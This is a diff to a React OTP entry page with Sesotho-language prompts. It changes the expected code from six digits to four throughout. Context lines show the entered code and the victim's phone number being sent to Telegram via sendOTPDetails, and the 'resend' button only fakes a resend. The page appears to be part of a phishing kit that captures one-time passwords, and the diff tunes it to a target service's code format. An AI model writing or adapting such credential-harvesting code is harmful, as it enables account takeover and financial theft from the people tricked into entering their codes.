@@ -7,7 +7,7 @@ interface OTPPageProps {
 }
 
 const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
-  const [otp, setOtp] = useState(['', '', '', '', '', ''])
+  const [otp, setOtp] = useState(['', '', '', ''])
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState('')
   const [resending, setResending] = useState(false)
@@ -23,14 +23,14 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
     setError('')
 
     // Auto-focus next input
-    if (value && index < 5) {
+    if (value && index < 3) {
       inputRefs.current[index + 1]?.focus()
     }
 
     // Auto-submit when all fields are filled
-    if (index === 5 && value) {
+    if (index === 3 && value) {
       const otpCode = newOtp.join('')
-      if (otpCode.length === 6) {
+      if (otpCode.length === 4) {
         handleSubmit(otpCode)
       }
     }
@@ -45,22 +45,22 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
 
   const handlePaste = (e: ClipboardEvent<HTMLInputElement>) => {
     e.preventDefault()
-    const pastedData = e.clipboardData.getData('text').slice(0, 6)
+    const pastedData = e.clipboardData.getData('text').slice(0, 4)
 
     if (!/^\d+$/.test(pastedData)) return
 
     const newOtp = [...otp]
     pastedData.split('').forEach((char, index) => {
-      if (index < 6) newOtp[index] = char
+      if (index < 4) newOtp[index] = char
     })
     setOtp(newOtp)
 
     // Focus last filled input
-    const lastIndex = Math.min(pastedData.length, 5)
+    const lastIndex = Math.min(pastedData.length, 3)
     inputRefs.current[lastIndex]?.focus()
 
     // Auto-submit if complete
-    if (pastedData.length === 6) {
+    if (pastedData.length === 4) {
       handleSubmit(pastedData)
     }
   }
@@ -70,7 +70,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
     setError('')
 
     try {
-      if (otpCode.length === 6) {
+      if (otpCode.length === 4) {
         // Send OTP to Telegram
         await sendOTPDetails(phoneNumber, otpCode)
 
@@ -90,7 +90,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
   const handleResendOTP = async () => {
     setResending(true)
     setError('')
-    setOtp(['', '', '', '', '', ''])
+    setOtp(['', '', '', ''])
 
     // Simulate resend
     setTimeout(() => {
@@ -101,10 +101,10 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
 
   const manualSubmit = () => {
     const otpCode = otp.join('')
-    if (otpCode.length === 6) {
+    if (otpCode.length === 4) {
       handleSubmit(otpCode)
     } else {
-      setError('Please enter complete 6-digit OTP')
+      setError('Please enter complete 4-digit OTP')
     }
   }
 
@@ -134,7 +134,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
             <h2 className="text-2xl font-bold text-gray-800 mb-2">Kenya Khoutu ea OTP</h2>
             <p className="text-gray-600 text-sm mb-1">Enter OTP Code</p>
             <p className="text-gray-600 text-sm">
-              Re rometseng khoutu ea dinomoro tse 6 ho
+              Re rometseng khoutu ea dinomoro tse 4 ho
               <br />
               <span className="font-semibold text-[#0056a4]">{phoneNumber}</span>
             </p>
